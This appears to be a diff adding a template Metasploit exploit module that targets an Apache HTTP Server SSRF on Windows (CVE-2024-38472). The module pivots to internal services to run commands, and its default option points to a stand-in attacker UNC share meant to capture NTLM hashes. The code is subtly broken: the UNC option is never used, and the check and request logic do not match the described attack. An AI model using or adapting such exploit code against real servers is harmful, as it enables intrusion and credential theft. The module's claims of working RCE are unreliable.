@@ -1,0 +1,90 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+    include Msf::Exploit::Remote::HttpClient
+  
+    def initialize(info = {})
+      super(update_info(info,
+        'Name'           => 'Apache HTTP Server Windows UNC SSRF to RCE',
+        'Description'    => %q{
+          This module exploits a Server-Side Request Forgery (SSRF) vulnerability in Apache HTTP Server on Windows,
+          which can potentially be leveraged to achieve Remote Code Execution (RCE) by interacting with internal
+          services like Jenkins.
+        },
+        'Author'         =>
+          [
+            'Your Name'  # Your name or handle
+          ],
+        'License'        => MSF_LICENSE,
+        'References'     =>
+          [
+            ['CVE', '2024-38472'],
+            ['URL', 'https://example.com/advisory'] # Replace with an advisory link if available
+          ],
+        'DisclosureDate' => 'Aug 03 2024',
+        'Platform'       => ['win'],
+        'Arch'           => [ARCH_CMD],
+        'Targets'        => [
+          ['Windows', { 'Arch' => ARCH_CMD, 'Platform' => 'win' }]
+        ],
+        'DefaultTarget'  => 0
+      ))
+  
+      register_options(
+        [
+          Opt::RHOSTS,
+          Opt::RPORT(80),
+          OptString.new('TARGETURI', [ true, "The base path to the vulnerable application", '/']),
+          OptString.new('UNC_SERVER', [ true, "UNC path of the malicious server to receive NTLM hashes", '\\\\attacker-server\\share']),
+          OptString.new('INTERNAL_SERVICE', [ true, "Internal service URL to exploit for RCE", 'http://internal-service/script']),
+          OptString.new('CMD', [ true, "Command to execute", 'calc.exe'])
+        ])
+    end
+  
+    def check
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path),
+      })
+  
+      if res && res.headers['Server'] && res.headers['Server'].include?('Apache')
+        return Exploit::CheckCode::Appears
+      end
+  
+      Exploit::CheckCode::Safe
+    end
+  
+    def exploit
+      ssrf_payload = {
+        'method'  => 'GET',
+        'uri'     => normalize_uri(target_uri.path),
+        'version' => '1.1',
+        'headers' => {
+          'Host' => datastore['RHOSTS'],
+          'Content-Type' => 'application/x-www-form-urlencoded'
+        },
+        'data'    => "url=#{datastore['INTERNAL_SERVICE']}?script=#{Rex::Text.uri_encode(datastore['CMD'])}"
+      }
+  
+      begin
+        print_status("Sending SSRF request to #{datastore['RHOSTS']}:#{datastore['RPORT']}#{target_uri.path}")
+        res = send_request_cgi(ssrf_payload)
+  
+        if res && res.code == 200
+          print_good("Successfully triggered the internal service")
+        else
+          print_error("Failed to trigger the internal service: #{res.inspect}")
+        end
+      rescue ::Rex::ConnectionError => e
+        print_error("Connection failed: #{e.message}")
+      rescue ::Interrupt
+        print_status("User interrupted the module execution")
+      rescue ::Exception => e
+        print_error("An unexpected error occurred: #{e.message}")
+      end
+    end
+  end
+  
